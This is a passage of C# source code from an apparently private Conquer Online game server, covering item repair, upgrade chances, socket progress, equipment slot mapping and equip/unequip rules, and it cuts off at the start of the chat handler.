                        case 7: QualityMultipier = 0.9; break;
                        case 6: QualityMultipier = 0.825; break;
                        default: QualityMultipier = 0.75; break;
                    }

                    int nRepairCost = 0;
                    if (Price > 0)
                        nRepairCost = (int)Math.Ceiling((Price * (item.MaximDurability - item.Durability) / item.MaximDurability) * QualityMultipier);

                    nRepairCost = Math.Max(1, nRepairCost);
                    if (client.Entity.Money >= (uint)nRepairCost)
                    {
                        client.Entity.Money -= (uint)nRepairCost;
                        item.Durability = item.MaximDurability;
                        item.Mode = Game.Enums.ItemMode.Update;
                        item.Send(client);
                        Database.ConquerItemTable.UpdateDurabilityItem(item);
                    }
                }
                else if (item.Durability == 0)
                {
                    if (client.Inventory.Remove(1088001, 5))
                    {
                        item.Durability = item.MaximDurability;
                        item.Mode = Game.Enums.ItemMode.Update;
                        item.Send(client);
                        Database.ConquerItemTable.UpdateDurabilityItem(item);
                    }
                }
            }
        }
        static void UpgradeItem(ItemUsage itemUsage, Client.GameState client)
        {
            ConquerItem item = null;
            if (client.Inventory.TryGetItem(itemUsage.UID, out item))
            {
                if (IsFranko(item.ID))
                    return;
                ConquerItem upgrade = null;
                if (client.Inventory.TryGetItem(itemUsage.dwParam, out upgrade))
                {
                    Database.ConquerItemInformation infos = new MTA.Database.ConquerItemInformation(item.ID, item.Plus);
                    switch (upgrade.ID)
                    {
                        case 1088000:
                            {
                                if (item.ID % 10 == (byte)Game.Enums.ItemQuality.Super)
                                    break;
                                byte chance = (byte)(70 - ((infos.BaseInformation.Level - (infos.BaseInformation.Level > 100 ? 30 : 0)) / (10 - item.ID % 10)));
                                if (item.Durability < item.MaximDurability)
                                    break;
                                if (Kernel.Rate(chance))
                                {
                                    switch ((Game.Enums.ItemQuality)(item.ID % 10))
                                    {
                                        case Game.Enums.ItemQuality.Normal:
                                        case Game.Enums.ItemQuality.NormalV1:
                                        case Game.Enums.ItemQuality.NormalV2:
                                        case Game.Enums.ItemQuality.NormalV3: item.ID = (item.ID - (item.ID % 10)) + (byte)Game.Enums.ItemQuality.Refined; break;
                                        default: item.ID++; break;
                                    }
                                    Database.ConquerItemTable.UpdateItemID(item, client);
                                    item.Mode = MTA.Game.Enums.ItemMode.Update;
                                    item.Send(client);
                                }
                                else
                                {
                                    item.Durability = (ushort)(item.Durability / 2);
                                    Database.ConquerItemTable.UpdateDurabilityItem(item);
                                    item.Mode = MTA.Game.Enums.ItemMode.Update;
                                    item.Send(client);
                                }
                                item = ItemSocket(item, 1);
                                client.Inventory.Remove(upgrade, MTA.Game.Enums.ItemUse.Remove);
                                break;
                            }
                        case 1088001:
                            {
                                if (infos.BaseInformation.Level == ItemMaxLevel(ItemPosition(infos.BaseInformation.ID)))
                                    break;
                                byte chance = 70;
                                chance -= (byte)(infos.BaseInformation.Level / 10 * 3);
                                chance -= (byte)(((item.ID % 10) + 1) * 3);
                                chance = 70;
                                if (item.Durability < item.MaximDurability)
                                    break;
                                uint newid = infos.CalculateUplevel();
                                if (newid != 0 && newid != item.ID)
                                {
                                    if (Kernel.Rate(chance))
                                    {
                                        item.ID = newid;
                                        infos = new MTA.Database.ConquerItemInformation(item.ID, item.Plus);
                                        item.Durability = item.MaximDurability = infos.BaseInformation.Durability;
                                        Database.ConquerItemTable.UpdateItemID(item, client);
                                        Database.ConquerItemTable.UpdateDurabilityItem(item);
                                        item.Mode = MTA.Game.Enums.ItemMode.Update;
                                        item.Send(client);
                                    }
                                    else
                                    {
                                        item.Durability = (ushort)(item.Durability / 2);
                                        Database.ConquerItemTable.UpdateDurabilityItem(item);
                                        item.Mode = MTA.Game.Enums.ItemMode.Update;
                                        item.Send(client);
                                    }
                                    //item = ItemSocket(item, 2);
                                    client.Inventory.Remove(upgrade, MTA.Game.Enums.ItemUse.Remove);
                                }
                                break;
                            }
                        case 1088002:
                            {
                                if (infos.BaseInformation.Level <= 15) return;
                                int startwith = (int)(infos.BaseInformation.ID / 1000);
                                int endwith = (int)(infos.BaseInformation.ID % 10);
                                var sitem = MTA.Database.ConquerItemInformation.BaseInformations.Values.Where(x => (x.ID % 10) == endwith && (x.ID / 1000) == startwith && x.Level >= 15).OrderBy(y => y.Level).First();
                                item.ID = sitem.ID;
                                infos = new MTA.Database.ConquerItemInformation(item.ID, item.Plus);
                                item.Durability = item.MaximDurability = infos.BaseInformation.Durability;
                                Database.ConquerItemTable.UpdateItemID(item, client);
                                Database.ConquerItemTable.UpdateDurabilityItem(item);
                                item.Mode = MTA.Game.Enums.ItemMode.Update;
                                item.Send(client);
                                item = ItemSocket(item, 2);
                                client.Inventory.Remove(upgrade, MTA.Game.Enums.ItemUse.Remove);
                                break;
                            }
                    }
                }
            }
        }

        static ConquerItem ItemSocket(ConquerItem item, byte type)
        {
            if (type == 1)
                item.SocketProgress += 10;
            else
                item.SocketProgress += 5;
            ushort need = 0;
            if (item.SocketOne == Game.Enums.Gem.NoSocket && item.SocketTwo == Game.Enums.Gem.NoSocket)
                need = Constants.SocketOneProgress;
            else if (item.SocketOne != Game.Enums.Gem.NoSocket && item.SocketTwo == Game.Enums.Gem.NoSocket)
                need = Constants.SocketTwoProgress;
            if (item.SocketProgress >= need && need != 0)
            {
                item.SocketProgress -= need;
                if (need == Constants.SocketOneProgress)
                    item.SocketOne = Game.Enums.Gem.EmptySocket;
                else
                    item.SocketTwo = Game.Enums.Gem.EmptySocket;
                Database.ConquerItemTable.UpdateSockets(item);
            }
            Database.ConquerItemTable.UpdateSocketProgress(item);
            return item;
        }
        public static byte ItemMaxLevel(ushort postion)
        {
            switch (postion)
            {
                case 0: return 0;
                case ConquerItem.Head: return 140;
                case ConquerItem.Necklace: return 139;
                case ConquerItem.Armor: return 140;
                case ConquerItem.LeftWeapon: return 140;
                case ConquerItem.RightWeapon: return 140;
                case ConquerItem.Boots: return 129;
                case ConquerItem.Ring: return 136;
                case ConquerItem.Tower: return 100;
                case ConquerItem.Fan: return 100;
                case ConquerItem.Wing: return 100;
                case ConquerItem.Steed: return 0;
                case ConquerItem.SteedCrop: return 30;
            }
            return 0;
        }
        public static byte ItemMinLevel(ushort postion)
        {
            switch (postion)
            {
                case 0: return 0;
                case ConquerItem.Head: return 15;
                case ConquerItem.Necklace: return 7;
                case ConquerItem.Armor: return 15;
                case ConquerItem.LeftWeapon: return 40;
                case ConquerItem.RightWeapon: return 5;
                case ConquerItem.Boots: return 10;
                case ConquerItem.Ring: return 10;
                case ConquerItem.Tower: return 0;
                case ConquerItem.Fan: return 0;
                case ConquerItem.Wing: return 0;
                case ConquerItem.Steed: return 0;
                case ConquerItem.SteedCrop: return 0;
            }
            return 0;
        }
        public static Positions GetPositionFromID(UInt32 itemid)
        {
            UInt32 iType = itemid / 1000;
            if (iType >= 111 && iType <= 118 || iType == 123 || iType >= 141 && iType <= 145 || iType == 148 || iType == 170)
                return Positions.Head;
            else if (iType >= 120 && iType <= 121)
                return Positions.Necklace;
            else if (iType >= 130 && iType <= 139 || iType == 101)
                return Positions.Armor;
            else if (iType >= 150 && iType <= 152)
                return Positions.Ring;
            else if (iType == 160)
                return Positions.Boots;
            else if (iType >= 181 && iType <= 194)
                return Positions.Garment;
            else if (iType == 201)
                return Positions.AttackTalisman;
            else if (iType == 202)
                return Positions.DefenceTalisman;
            else if (iType == 203)
                return Positions.SteedTalisman;
            else if (iType == 200)
                return Positions.SteedArmor;
            else if (iType == 300)
                return Positions.Steed;
            else if (iType == 2100)
                return Positions.Bottle;
            else if (iType == 1050 || iType == 900 || iType == 619)
                return Positions.Left;
            else if ((iType >= 410 && iType <= 490) || (iType >= 500 && iType <= 580) || (iType >= 601 && iType <= 617) || iType == 620 || iType == 622 || iType == 624 || iType == 626)
                return Positions.Right;
            else if (iType >= 350 && iType <= 370)
                return Positions.RightAccessory;
            else if (iType == 380)
                return Positions.LeftAccessory;
            else if (iType == 204)
                return Positions.Wing;
            else return (Positions)0;
        }
        public static ushort ItemPosition(uint ID)
        {
            if ((ID >= 111003 && ID <= 118309) || (ID >= 123000 && ID <= 123309) || (ID >= 141003 && ID <= 145069) || (ID >= 148000 && ID <= 148309) || (ID >= 170000 && ID <= 170309))
                return ConquerItem.Head;
            else if (ID >= 120001 && ID <= 121269)
                return ConquerItem.Necklace;
            else if ((ID >= 130003 && ID <= 139309) || (ID >= 101000 && ID <= 101309) || (ID >= 101313 && ID <= 101319))
                return ConquerItem.Armor;
            else if (ID >= 150000 && ID <= 152279)
                return ConquerItem.Ring;
            else if (ID >= 160013 && ID <= 160249)
                return ConquerItem.Boots;
            else if (ID >= 181305 && ID <= 194300)
                return ConquerItem.Garment;
            else if (ID >= 201003 && ID <= 201009)
                return ConquerItem.Fan;
            else if (ID >= 202003 && ID <= 202009)
                return ConquerItem.Tower;
            else if (ID >= 203003 && ID <= 203009)
                return ConquerItem.SteedCrop;
            else if (ID == 300000)
                return ConquerItem.Steed;
            else if (ID >= 410003 && ID <= 617439 || ID >= 620003 && ID <= 620439 || ID >= 622000 && ID <= 622439 || ID >= 624003 && ID <= 624439 || ID >= 626003 && ID <= 626439)
                return ConquerItem.RightWeapon;
            else if ((ID >= 900000 && ID <= 900309) || ID >= 1050000 && ID <= 1051052 || ID >= 619000 && ID <= 619439 || ID >= 624003 && ID <= 624439 || ID >= 626003 && ID <= 626439/* || ID >= 624000 && ID <= 624439*/)
                return ConquerItem.LeftWeapon;
            else if (ID >= 2100005 && ID <= 2100125)
                return ConquerItem.Bottle;
            else if (ID >= 350001 && ID <= 380030)
                return ConquerItem.LeftWeaponAccessory;
            else if (ID >= 350001 && ID <= 380030)
                return ConquerItem.RightWeaponAccessory;
            else if (ID >= 200000 && ID <= 200540)
                return ConquerItem.SteedArmor;
            else if (ID >= 204003 && ID <= 204009)
                return ConquerItem.Wing;
            return 0;
        }

        public static bool IsFranko(uint ID)
        {
            if (ID >= 1050000 && ID <= 1051000)
                return true;
            return false;
        }
        public static bool IsWing(uint ID)
        {
            if (ID >= 204005 && ID <= 205129)
                return true;
            return false;
        }
        public static bool IsTwoHand(uint ID)
        {
            return (ID.ToString()[0] == '5' ? true : false);
        }
        public static bool IsAccessory(uint ID)
        {
            return ID >= 350001 && ID <= 380015;
        }
        public enum Positions : byte
        {
            Inventory = 0,
            Head = 1,
            Necklace = 2,
            Armor = 3,
            Right = 4,
            Left = 5,
            Ring = 6,
            Bottle = 7,
            Boots = 8,
            Garment = 9,
            AttackTalisman = 10,
            DefenceTalisman = 11,
            Steed = 12,
            SteedTalisman = 18,
            RightAccessory = 15,
            LeftAccessory = 16,
            SteedArmor = 17,
            Wing = 19
        }
        public static Positions ItemPositionFromID(UInt32 itemid)
        {
            UInt32 iType = itemid / 1000;

            if (iType >= 111 && iType <= 118 || iType == 123 || iType >= 141 && iType <= 143 || iType == 145)
                return Positions.Head;
            else if (iType >= 120 && iType <= 121)
                return Positions.Necklace;
            else if (iType >= 130 && iType <= 137)
                return Positions.Armor;
            else if (iType >= 150 && iType <= 152)
                return Positions.Ring;
            else if (iType == 160)
                return Positions.Boots;
            else if (iType >= 181 && iType <= 194)
                return Positions.Garment;
            else if (iType == 201)
                return Positions.AttackTalisman;
            else if (iType == 202)
                return Positions.DefenceTalisman;
            else if (iType == 203)
                return Positions.SteedTalisman;
            else if (iType == 200)
                return Positions.SteedArmor;
            else if (iType >= 204 && iType <= 205)
                return Positions.Wing;
            else if (iType == 300)
                return Positions.Steed;
            else if (iType == 2100)
                return Positions.Bottle;
            else if (iType == 1050 || iType == 900)
                return Positions.Left;
            else if ((iType >= 410 && iType <= 490) || (iType >= 500 && iType <= 580) || (iType >= 601 && iType <= 613) || (iType >= 616 && iType <= 617 || (iType >= 619 && iType <= 620)) || (iType == 622))
                return Positions.Right;
            else if (iType >= 350 && iType <= 370)
                return Positions.RightAccessory;
            else if (iType == 380)
                return Positions.LeftAccessory;

            else return (Positions)0;
        }
        public static bool Knife(uint ID)
        {
            if (ID >= 613000 && ID <= 613429)
            { return true; }
            else { return false; }
        }
        public static bool UniverseHossu(uint ID)
        {
            return ID >= 619000 && ID <= 619439;
        }
        public static bool StarTower(uint ID)
        {
            return ID >= 202003 && ID <= 202009;
        }
        public static bool HeavenFan(uint ID)
        {
            return ID >= 201003 && ID <= 201009;
        }
        public static bool Necklace(uint ID)
        {
            return ID >= 120001 && ID <= 120269;
        }
        public static bool Ring(uint ID)
        {
            return ID >= 150003 && ID <= 150269;
        }
        public static bool Boots(uint ID)
        {
            return ID >= 160013 && ID <= 160249;
        }
        public static bool RidingCrop(uint ID)
        {
            return ID >= 203003 && ID <= 203009;
        }
        public static bool Wing(uint ID)
        {
            return ID >= 204003 && ID <= 204009;
        }
        public static bool LordPistol(uint ID)
        {
            if (ID >= 612000 && ID <= 612439)
            { return true; }
            else { return false; }
        }
        public static void EquipItem(ItemUsage itemUsage, Client.GameState client)
        {
            ConquerItem item = null;
            client.Entity.AttackPacket = null;
            if (client.Inventory.TryGetItem(itemUsage.UID, out item) && client.Booth == null)
            {
                if (item.Suspicious)
                    return;
                if (item.ID / 1000 >= 600)
                {
                    if (itemUsage.dwParam == 4)
                    {
                        if (!client.Equipment.Free(5))
                        {
                            if (item.ID / 1000 != client.Equipment.TryGetItem(5).ID / 1000)
                            {
                                return;
                            }
                        }
                    }
                }
                Positions pos = GetPositionFromID(item.ID);
                if (pos == Positions.Inventory)
                {
                    UseItem(item, client);
                    return;
                }

                if (ItemPosition(item.ID) == ConquerItem.Garment)
                    if (client.Entity.Tournament_Signed)
                        return;
                #region Sanity checks

                bool can2hand = false;
                bool can2wpn = false;
                uint dwExtra = 0;
                if (itemUsage.dwParam > 20)
                    dwExtra = 20;
                if (client.Entity.Class >= 11 && client.Entity.Class <= 75)
                    can2hand = true;
                if (client.Entity.Class >= 11 && client.Entity.Class <= 15 || client.Entity.Class >= 51 && client.Entity.Class <= 55 || client.Entity.Class >= 61 && client.Entity.Class <= 65 || client.Entity.Class >= 71 && client.Entity.Class <= 75)
                    can2wpn = true;
                if (client.Entity.Class >= 71 && client.Entity.Class <= 75 || client.Entity.Class >= 41 && client.Entity.Class <= 45)
                    can2wpn = true;
                if (client.Entity.Class >= 20 && client.Entity.Class <= 25)
                {
                    can2hand = true;
                    can2wpn = true;
                }
                if (client.Entity.Class >= 50 && client.Entity.Class <= 55)
                {
                    can2hand = true;
                    can2wpn = true;
                }
                if (client.Entity.Class >= 130 && client.Entity.Class <= 135 || client.Entity.Class >= 140 && client.Entity.Class <= 145)
                {
                    can2hand = true;
                    can2wpn = true;
                }
                if (client.Entity.Class >= 80 && client.Entity.Class <= 85)
                {
                    can2hand = true;
                    can2wpn = true;
                }
                if (client.Entity.Class >= 160 && client.Entity.Class <= 165)
                {
                    can2hand = true;
                    can2wpn = true;
                }
                //if (client.Entity.Class >= 100)
                //    can2wpn = false;
                if (!Equipable(item, client))
                    return;
                if (ItemPosition(item.ID) == 5)
                {
                    itemUsage.dwParam = 5 + dwExtra;
                    if (!can2hand && !can2wpn)
                        return;
                    if (client.Equipment.Free(4 + dwExtra) || (client.Equipment.TryGetItem(4 + dwExtra).ID / 1000 != 500 && IsFranko(item.ID)))
                        return;
                }
                if (ItemPosition(item.ID) == 4)
                {
                    if (itemUsage.dwParam == 5 + dwExtra)
                        if (!can2hand || !can2wpn)
                            return;
                }
                if (!((itemUsage.dwParam == 4 + dwExtra || itemUsage.dwParam == 5 + dwExtra) && (ItemPosition(item.ID) == 4 || ItemPosition(item.ID) == 5)))
                {
                    if (!IsAccessory(item.ID))
                        itemUsage.dwParam = ItemPosition(item.ID) + dwExtra;
                }
                #region Hossu
                if (client.Entity.Class >= 130 && client.Entity.Class <= 135 || client.Entity.Class >= 140 && client.Entity.Class <= 145)
                {
                    if ((itemUsage.dwParam - dwExtra) == 5)
                    {
                        if ((item.ID / 1000) == 421 || (item.ID / 1000) == 620)
                            return;
                        var rItem = client.Equipment.TryGetItem((byte)(4 + dwExtra));
                        if (rItem != null)
                        {
                            if (item.ID / 1000 == 619)
                            {
                                if ((rItem.ID / 1000) != 421 && (rItem.ID / 1000) != 620)
                                    return;
                            }
                            else
                                return;

                        }
                    }
                    if ((itemUsage.dwParam - dwExtra) == 4)
                    {
                        var rItem = client.Equipment.TryGetItem((byte)(5 + dwExtra));
                        if (rItem != null)
                        {
                            if (rItem.ID / 1000 == 619)
                            {
                                if ((item.ID / 1000) != 421 && (item.ID / 1000) != 620)
                                    return;
                            }

                        }
                    }
                }
                #endregion Hossu
                bool twohand = IsTwoHand(item.ID);
                if (!twohand && itemUsage.dwParam == 4 + dwExtra)
                {
                    if (!client.Equipment.Free((byte)(5 + dwExtra)))
                    {
                        if (client.Inventory.Count < 40)
                        {
                            if (IsFranko(client.Equipment.TryGetItem((byte)(5 + dwExtra)).ID))
                                client.Equipment.Remove((byte)(5 + dwExtra));
                            else
                            {
                                if (client.Equipment.TryGetItem((byte)(4 + dwExtra)) != null)
                                {
                                    if (IsTwoHand(client.Equipment.TryGetItem((byte)(4 + dwExtra)).ID))
                                        client.Equipment.Remove((byte)(4 + dwExtra));
                                }
                            }
                        }
                    }
                }

                if ((itemUsage.dwParam - dwExtra) == 5)
                {
                    if ((item.ID / 1000) == 421 || IsTwoHand(item.ID))
                        return;
                    var rItem = client.Equipment.TryGetItem((byte)(4 + dwExtra));
                    if (rItem != null)
                    {
                        if (rItem.IsTwoHander())
                        {
                            if (IsFranko(item.ID))
                            {
                                if (rItem.ID / 1000 != 500) return;
                            }
                            else
                            {
                                if (IsShield(item.ID))
                                {
                                    if ((rItem.ID / 1000) == 421) return;
                                    if (!client.Spells.ContainsKey(10311) && client.Entity.FirstRebornClass == 25 && client.Entity.SecondRebornClass == 25)//Perseverance
                                    {
                                        client.Send(new Message("You need to know Perseverance (Warrior Pure skill) to be able to wear 2-handed weapon and shield.", System.Drawing.Color.Red, Message.Talk));
                                        return;
                                    }
                                }
                                else if (item.ID / 1000 == 619)
                                {
                                    if ((rItem.ID / 1000) != 421 && (rItem.ID / 1000) != 620)
                                        return;
                                }
                                else
                                    itemUsage.dwParam = 4 + dwExtra;
                            }
                        }
                    }
                }
                if (itemUsage.dwParam == 4 + dwExtra)
                    if (client.Entity.ContainsFlag(Update.Flags.Fly))
                        if (item.ID / 1000 != 500)
                            return;

                if (!((client.Entity.Class >= 50 && client.Entity.Class <= 55)))
                    if ((item.ID / 1000) == 601)
                        if ((itemUsage.dwParam - dwExtra) == 5)
                            return;
                #endregion
                uint itemType = item.ID / 1000;
                if (itemType == 613)
                {
                    if ((client.Entity.Class >= 70 && client.Entity.Class <= 75) || (client.Entity.Class >= 60 && client.Entity.Class <= 65 || (client.Entity.Class >= 10 && client.Entity.Class <= 15 || (client.Entity.Class >= 50 && client.Entity.Class <= 55 || (client.Entity.Class >= 20 && client.Entity.Class <= 25 || (client.Entity.Class >= 142 && client.Entity.Class <= 145 || (client.Entity.Class >= 132 && client.Entity.Class <= 135)))))))
                    {
                        item.Position = 0; return;
                    }
                }
                if (itemType == 612)
                {
                    if ((client.Entity.Class >= 60 && client.Entity.Class <= 65 || (client.Entity.Class >= 10 && client.Entity.Class <= 15 || (client.Entity.Class >= 50 && client.Entity.Class <= 55 || (client.Entity.Class >= 20 && client.Entity.Class <= 25 || (client.Entity.Class >= 142 && client.Entity.Class <= 145 || (client.Entity.Class >= 132 && client.Entity.Class <= 135)))))))
                    {
                        item.Position = 0; return;
                    }
                }
                if (client.Entity.ContainsFlag3(Update.Flags3.Assassin))
                    if (item.ID / 1000 != 613)
                        return;

                if (client.Map.ID == 1039)
                    client.Entity.AttackPacket = null;

                item.Position = (ushort)itemUsage.dwParam;
                if (ItemPosition(item.ID) == 5 && !IsFranko(item.ID))
                {
                    if (IsTwoHand(client.Equipment.TryGetItem((byte)(4 + dwExtra)).ID))
                    {
                        if (!client.Spells.ContainsKey(10311))//Perseverance
                        {
                            client.Send(new Message("You need to know Perseverance (Warrior Pure skill) to be able to wear 2-handed weapon and shield.", System.Drawing.Color.Red, Message.Talk));
                            return;
                        }
                    }
                }
                //  uint itemType = item.ID / 1000;
                if (itemType == 421)
                {//Backsword
                    if (item.Position == 5 + dwExtra)
                    {
                        item.Position = 0;
                        return;
                    }
                }
                if (itemType == 900)
                {
                    if (!(client.Entity.Class >= 20 && client.Entity.Class <= 25))
                    {
                        item.Position = 0;
                        return;
                    }
                }
                if (itemUsage.dwParam == ConquerItem.RightWeaponAccessory)
                    if (client.WeaponLook > 0)
                        return;
                if (itemUsage.dwParam == ConquerItem.LeftWeaponAccessory)
                    if (client.WeaponLook2 > 0)
                        return;
                //Database.ConquerItemTable.ClearPosition(client.Entity.UID, (byte)itemUsage.dwParam);
                client.Inventory.Remove(item, Game.Enums.ItemUse.Move, true);
                if (client.Equipment.Free((byte)itemUsage.dwParam))
                {
                    if (twohand)
                        client.Equipment.Remove((byte)(5 + dwExtra));
                    item.Position = (byte)itemUsage.dwParam;
                    client.Equipment.Add(item);
                    item.Mode = Game.Enums.ItemMode.Update;
                    item.Send(client);
                }
                else
                {
                    if (twohand)
                        client.Equipment.Remove((byte)(5 + dwExtra));
                    if (IsBow(client.Equipment.TryGetItem((byte)itemUsage.dwParam).ID))
                    {
                        client.Entity.RemoveFlag(Update.Flags.Fly);
                    }
                    client.Equipment.Remove((byte)itemUsage.dwParam);
                    item.Position = (byte)itemUsage.dwParam;
                    client.Equipment.Add(item);
                }

                var iu = new Network.GamePackets.ItemUsage(true);
                iu.ID = 5;
                iu.UID = itemUsage.UID;
                iu.dwParam = itemUsage.dwParam;
                client.Send(iu);

                client.CalculateStatBonus();
                client.CalculateHPBonus();
                client.LoadItemStats();
                ClientEquip equips = new ClientEquip();
                equips.DoEquips(client);
                client.Send(equips);

                Database.ConquerItemTable.UpdateLocation(item, client);
                client.Equipment.UpdateEntityPacket();
                if (itemUsage.dwParam == ConquerItem.Armor)
                    if (client.ArmorLook > 0)
                        client.SetNewArmorLook(client.ArmorLook);
                if (itemUsage.dwParam == ConquerItem.Head)
                    if (client.HeadgearLook > 0)
                        client.SetNewHeadgearLook(client.HeadgearLook);
                if (itemUsage.dwParam == ConquerItem.RightWeapon)
                    if (client.WeaponLook > 0)
                        client.SetNewWeaponLook(client.WeaponLook);
                if (itemUsage.dwParam == ConquerItem.LeftWeapon)
                    if (client.WeaponLook2 > 0)
                        client.SetNewWeaponLook2(client.WeaponLook2);
            }
        }
        public static void UnequipItem(ItemUsage usage, Client.GameState client)
        {
            if (client.Entity.ContainsFlag3(Update.Flags3.Assassin))
                if (usage.dwParam == 4)
                    return;
            if (!client.Equipment.Free((byte)usage.dwParam))
                if (ItemPosition(client.Equipment.TryGetItem((byte)usage.dwParam).ID) == ConquerItem.Garment)
                    if (ItemPosition(client.Equipment.TryGetItem((byte)usage.dwParam).ID) == ConquerItem.Wing)
                        if (client.Entity.Tournament_Signed)
                            return;
            if (!client.Equipment.Free((byte)usage.dwParam))
                if (IsBow(client.Equipment.TryGetItem((byte)usage.dwParam).ID))
                    client.Entity.RemoveFlag(Update.Flags.Fly);

            if (client.Equipment.Remove((byte)usage.dwParam))
            {
                if (client.Map.ID == 1039)
                    client.Entity.AttackPacket = null;
                client.CalculateStatBonus();
                client.CalculateHPBonus();
                client.LoadItemStats();
                ClientEquip equips = new ClientEquip();
                equips.DoEquips(client);
                client.Send(equips);
            }
        }

        static bool EquipPassLvlReq(Database.ConquerItemBaseInformation baseInformation, Client.GameState client)
        {
            if (client.Entity.Level < baseInformation.Level)
                return false;
            else
                return true;
        }
        static bool EquipPassRbReq(Database.ConquerItemBaseInformation baseInformation, Client.GameState client)
        {
            if (baseInformation.Level < 71 && client.Entity.Reborn > 0 && client.Entity.Level >= 70)
                return true;
            else
                return false;
        }
        static bool EquipPassStatsReq(Database.ConquerItemBaseInformation baseInformation, Client.GameState client)
        {
            if (client.Entity.Strength >= baseInformation.Strength && client.Entity.Agility >= baseInformation.Agility)
                return true;
            else
                return false;
        }
        static bool EquipPassJobReq(Database.ConquerItemBaseInformation baseInformation, Client.GameState client)
        {
            switch (baseInformation.Class)
            {
                #region Trojan
                case 10: if (client.Entity.Class <= 15 && client.Entity.Class >= 10) return true; break;
                case 11: if (client.Entity.Class <= 15 && client.Entity.Class >= 11) return true; break;
                case 12: if (client.Entity.Class <= 15 && client.Entity.Class >= 12) return true; break;
                case 13: if (client.Entity.Class <= 15 && client.Entity.Class >= 13) return true; break;
                case 14: if (client.Entity.Class <= 15 && client.Entity.Class >= 14) return true; break;
                case 15: if (client.Entity.Class == 15) return true; break;
                #endregion
                #region Warrior
                case 20: if (client.Entity.Class <= 25 && client.Entity.Class >= 20) return true; break;
                case 21: if (client.Entity.Class <= 25 && client.Entity.Class >= 21) return true; break;
                case 22: if (client.Entity.Class <= 25 && client.Entity.Class >= 22) return true; break;
                case 23: if (client.Entity.Class <= 25 && client.Entity.Class >= 23) return true; break;
                case 24: if (client.Entity.Class <= 25 && client.Entity.Class >= 24) return true; break;
                case 25: if (client.Entity.Class == 25) return true; break;
                #endregion
                #region Archer
                case 40: if (client.Entity.Class <= 45 && client.Entity.Class >= 40) return true; break;
                case 41: if (client.Entity.Class <= 45 && client.Entity.Class >= 41) return true; break;
                case 42: if (client.Entity.Class <= 45 && client.Entity.Class >= 42) return true; break;
                case 43: if (client.Entity.Class <= 45 && client.Entity.Class >= 43) return true; break;
                case 44: if (client.Entity.Class <= 45 && client.Entity.Class >= 44) return true; break;
                case 45: if (client.Entity.Class == 45) return true; break;
                #endregion
                #region Ninja
                case 50: if (client.Entity.Class <= 55 && client.Entity.Class >= 50) return true; break;
                case 51: if (client.Entity.Class <= 55 && client.Entity.Class >= 51) return true; break;
                case 52: if (client.Entity.Class <= 55 && client.Entity.Class >= 52) return true; break;
                case 53: if (client.Entity.Class <= 55 && client.Entity.Class >= 53) return true; break;
                case 54: if (client.Entity.Class <= 55 && client.Entity.Class >= 54) return true; break;
                case 55: if (client.Entity.Class == 55) return true; break;
                #endregion
                #region Monk
                case 60: if (client.Entity.Class <= 65 && client.Entity.Class >= 60) return true; break;
                case 61: if (client.Entity.Class <= 65 && client.Entity.Class >= 61) return true; break;
                case 62: if (client.Entity.Class <= 65 && client.Entity.Class >= 62) return true; break;
                case 63: if (client.Entity.Class <= 65 && client.Entity.Class >= 63) return true; break;
                case 64: if (client.Entity.Class <= 65 && client.Entity.Class >= 64) return true; break;
                case 65: if (client.Entity.Class == 65) return true; break;
                #endregion
                #region Pirate
                case 70: if (client.Entity.Class <= 75 && client.Entity.Class >= 70) return true; break;
                case 71: if (client.Entity.Class <= 75 && client.Entity.Class >= 71) return true; break;
                case 72: if (client.Entity.Class <= 75 && client.Entity.Class >= 72) return true; break;
                case 73: if (client.Entity.Class <= 75 && client.Entity.Class >= 73) return true; break;
                case 74: if (client.Entity.Class <= 75 && client.Entity.Class >= 74) return true; break;
                case 75: if (client.Entity.Class == 75) return true; break;
                #endregion
                #region Taoist
                case 190: if (client.Entity.Class >= 100 && client.Entity.Class <= 145) return true; break;
                #endregion
                #region LeeLong
                case 80: if (client.Entity.Class <= 85 && client.Entity.Class >= 80) return true; break;
                case 81: if (client.Entity.Class <= 85 && client.Entity.Class >= 81) return true; break;
                case 82: if (client.Entity.Class <= 85 && client.Entity.Class >= 82) return true; break;
                case 83: if (client.Entity.Class <= 85 && client.Entity.Class >= 83) return true; break;
                case 84: if (client.Entity.Class <= 85 && client.Entity.Class >= 84) return true; break;
                case 85: if (client.Entity.Class == 85) return true; break;
                #endregion
                #region Windwalker
                case 160: if (client.Entity.Class <= 165 && client.Entity.Class >= 160) return true; break;
                case 161: if (client.Entity.Class <= 165 && client.Entity.Class >= 161) return true; break;
                case 162: if (client.Entity.Class <= 165 && client.Entity.Class >= 162) return true; break;
                case 163: if (client.Entity.Class <= 165 && client.Entity.Class >= 163) return true; break;
                case 164: if (client.Entity.Class <= 165 && client.Entity.Class >= 164) return true; break;
                case 165: if (client.Entity.Class == 165) return true; break;
                #endregion

                case 0: return true;
                default: return false;
            }
            return false;
        }
        static bool EquipPassSexReq(Database.ConquerItemBaseInformation baseInformation, Client.GameState client)
        {
            int ClientGender = client.Entity.Body / 1000;
            if (baseInformation.Gender == ClientGender || baseInformation.Gender == 0)
                return true;
            return false;
        }
        static bool Equipable(ConquerItem item, Client.GameState client)
        {
            Database.ConquerItemBaseInformation BaseInformation = new Database.ConquerItemInformation(item.ID, item.Plus).BaseInformation;
            bool pass = false;
            if (!EquipPassSexReq(BaseInformation, client))
                return false;
            if (EquipPassRbReq(BaseInformation, client))
                pass = true;
            else
                if (EquipPassJobReq(BaseInformation, client)) if (EquipPassStatsReq(BaseInformation, client)) if (EquipPassLvlReq(BaseInformation, client)) pass = true;
            if (!pass)
                return false;

            if (client.Entity.Reborn > 0)
            {
                if (client.Entity.Level >= 70 && BaseInformation.Level <= 70)
                    return pass;
                else
                {
                    Interfaces.IProf proficiency = null;
                    client.Proficiencies.TryGetValue((ushort)(item.ID / 1000), out proficiency);
                    if (proficiency != null)
                    {
                        if (proficiency.Level >= BaseInformation.Proficiency)
                            pass = true;
                        else
                            pass = false;
                    }
                }
            }
            else
            {
                if (!IsFranko(item.ID))
                {
                    Interfaces.IProf proficiency = null;
                    client.Proficiencies.TryGetValue((ushort)(item.ID / 1000), out proficiency);
                    if (proficiency != null)
                    {
                        if (proficiency.Level >= BaseInformation.Proficiency)
                            pass = true;
                        else
                            pass = false;
                    }
                }
            }
            return pass;
        }

        #endregion

        #region Chat
        static void Chat(Message message, Client.GameState client)
        {
            message._From = client.Entity.Name;
            //Console.WriteLine("[" + client.Entity.Name + "][Chat] " + message.__Message);
            if (!CheckCommand(message.__Message, client, false))
            {
                if (message.ChatType != Message.Service)
                {
                    if (client.ChatBanned)
